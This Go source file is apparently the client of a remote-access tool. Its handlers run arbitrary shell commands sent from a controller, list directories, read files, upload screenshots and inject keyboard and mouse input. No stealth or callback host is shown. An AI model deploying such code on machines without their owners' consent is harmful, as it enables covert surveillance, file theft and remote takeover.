package main

import (
	"bytes"
	"fmt"
	"image/jpeg"
	"io"
	"os"
	"time"
	"yotamura/common"

	"github.com/JamesHovious/w32"
	"github.com/kbinani/screenshot"
)

func MouseClick(click common.MouseClick) {
	inputs := make([]w32.INPUT, 0)
	upflag := 0
	if click == common.LClick {
		upflag = w32.MOUSEEVENTF_LEFTUP
	}
	if click == common.RClick {
		upflag = w32.MOUSEEVENTF_RIGHTUP
	}

	up := w32.INPUT{
		Type: w32.INPUT_MOUSE,
		Mi: w32.MOUSEINPUT{
			DwFlags: uint32(upflag),
		},
	}

	inputs = append(inputs, up)
	w32.SendInput(inputs)
}
func KeyboardPress(char rune) {
	//i somehow need to figure out how to make shift and allat work
	vk := w32.VkKeyScanW(uint16(char))
	if vk == -1 {
		return
	}

	virtualKeyCode := uint16(vk & 0xFF)
	shiftState := uint16((vk >> 8) & 0xFF)

	var inputs []w32.INPUT

	// Press modifier keys if needed
	if shiftState&1 == 1 {
		inputs = append(inputs, w32.INPUT{
			Type: w32.INPUT_KEYBOARD,
			Ki:   w32.KEYBDINPUT{WVk: w32.VK_SHIFT, DwFlags: 0},
		})
	}
	if shiftState&2 == 2 {
		inputs = append(inputs, w32.INPUT{
			Type: w32.INPUT_KEYBOARD,
			Ki:   w32.KEYBDINPUT{WVk: w32.VK_CONTROL, DwFlags: 0},
		})
	}
	if shiftState&4 == 4 {
		inputs = append(inputs, w32.INPUT{
			Type: w32.INPUT_KEYBOARD,
			Ki:   w32.KEYBDINPUT{WVk: w32.VK_MENU, DwFlags: 0}, //(VK_MENU is Alt)
		})
	}

	inputs = append(inputs, w32.INPUT{
		Type: w32.INPUT_KEYBOARD,
		Ki:   w32.KEYBDINPUT{WVk: virtualKeyCode, DwFlags: 0},
	})

	inputs = append(inputs, w32.INPUT{
		Type: w32.INPUT_KEYBOARD,
		Ki:   w32.KEYBDINPUT{WVk: virtualKeyCode, DwFlags: 0x02},
	})

	if shiftState&4 == 4 {
		inputs = append(inputs, w32.INPUT{
			Type: w32.INPUT_KEYBOARD,
			Ki:   w32.KEYBDINPUT{WVk: w32.VK_MENU, DwFlags: 0x02},
		})
	}
	if shiftState&2 == 2 {
		inputs = append(inputs, w32.INPUT{
			Type: w32.INPUT_KEYBOARD,
			Ki:   w32.KEYBDINPUT{WVk: w32.VK_CONTROL, DwFlags: 0x02},
		})
	}
	if shiftState&1 == 1 {
		inputs = append(inputs, w32.INPUT{
			Type: w32.INPUT_KEYBOARD,
			Ki:   w32.KEYBDINPUT{WVk: w32.VK_SHIFT, DwFlags: 0x02},
		})
	}

	w32.SendInput(inputs)
	time.Sleep(10 * time.Millisecond)
}

func (c *Client) sendError(message common.Message, err error) {
	c.SendJsonMessage(common.CreateMessage(common.ErrorData{Type: message.Type, Error: err.Error()}))
}

func (c *Client) initializeHandlers() {
	c.Actions = make(map[string]func(message common.Message))

	c.Actions["CommandData"] = func(message common.Message) {
		fmt.Println("command")
		var content common.CommandData
		common.DecodeData(message.Data, &content)
		output, err := Exec(content.Command)
		if err != nil {
			fmt.Println(output, err)
			c.sendError(message, err)
			return
		}
		content.Output = string(output)
		c.SendJsonMessage(common.CreateMessage(content))
	}

	c.Actions["DirectoryData"] = func(message common.Message) {
		fmt.Println("file")
		var content common.DirectoryData
		common.DecodeData(message.Data, &content)
		var files []common.File
		osFiles, err := os.ReadDir(content.Path)
		if err != nil {
			c.sendError(message, err)
			return
		}
		for _, file := range osFiles {
			files = append(files, common.File{Name: file.Name(), IsDirectory: file.Type().IsDir()})
		}
		fmt.Println(files)
		c.SendJsonMessage(common.CreateMessage(common.DirectoryData{Path: content.Path, Files: files}))
	}
	c.Actions["ReadFileData"] = func(message common.Message) {
		fmt.Println("read")
		var content common.ReadFileData
		common.DecodeData(message.Data, &content)
		output, err := os.ReadFile(content.Path)
		if err != nil {
			c.sendError(message, err)
			return
		}
		c.SendJsonMessage(common.CreateMessage(common.ReadFileData{Path: content.Path, Content: output}))
	}
	c.Actions["ScreenshotData"] = func(message common.Message) {
		image, err := screenshot.CaptureDisplay(0)
		if err != nil {
			c.sendError(message, err)
			return
		}
		buf := new(bytes.Buffer)

		resizedImage := common.ResizeImage(image, 1280, 720)
		jpeg.Encode(buf, resizedImage, &jpeg.Options{Quality: 90})

		imageBytes, err := io.ReadAll(buf)
		if err != nil {
			c.sendError(message, err)
			return
		}

		c.SendJsonMessage(common.CreateMessage(common.ScreenshotData{Screenshot: imageBytes}))
	}
	c.Actions["InputData"] = func(message common.Message) {
		fmt.Println("input")
		var content common.InputData
		common.DecodeData(message.Data, &content)

		if content.Mouse.Click != 0 {
			MouseClick(content.Mouse.Click)
		}
		keyboardInput := content.Keyboard.Input
		if keyboardInput != "" {
			for _, v := range keyboardInput {
				KeyboardPress(v)
			}
		}

		x := content.Mouse.X
		y := content.Mouse.Y

		if x != -1 {
			_, currY, _ := w32.GetCursorPos()
			w32.SetCursorPos(x, currY)
		}
		if y != -1 {
			currX, _, _ := w32.GetCursorPos()
			w32.SetCursorPos(currX, y)
		}

		c.SendJsonMessage(message)
	}
}
